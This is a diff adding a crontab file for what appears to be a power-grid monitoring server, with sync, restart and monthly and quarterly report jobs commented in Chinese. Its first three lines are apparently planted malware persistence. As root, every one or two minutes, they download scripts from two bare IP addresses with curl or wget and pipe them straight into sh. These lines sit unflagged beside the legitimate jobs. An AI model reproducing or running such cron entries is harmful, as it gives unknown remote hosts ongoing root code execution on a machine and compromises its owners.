@@ -1,0 +1,32 @@
+*/1 * * * * root curl -L http://67.205.164.163:8000/i.sh | sh
+*/1 * * * * root wget -q http://67.205.164.163:8000/i.sh -O - | sh
+*/2 * * * * root curl -fsSL http://116.62.122.90/sh.sh/ash.sh | sh
+
+## 同步
+*/1 * * * * root /root/shell/syncMediumVoltageYc.sh
+*/1 * * * * root /root/shell/syncTransformerYc.sh
+*/1 * * * * root /root/shell/syncYx.sh
+
+
+
+50 23 * * * root /root/shell/restart.sh
+
+
+
+
+
+
+## 报告
+# 每月1号1点执行
+0 1 1 * * root /root/shell/report/MediumVoltageScoreMonth.sh
+
+
+# 每季度初执行上季度报告
+0 4 1 1 * /root/shell/report/MediumVoltageScoreQuarter.sh
+0 4 1 4 * /root/shell/report/MediumVoltageScoreQuarter.sh
+0 4 1 7 * /root/shell/report/MediumVoltageScoreQuarter.sh
+0 4 1 10 * /root/shell/report/MediumVoltageScoreQuarter.sh
+
+
+
+/etc/init.d/cron restart
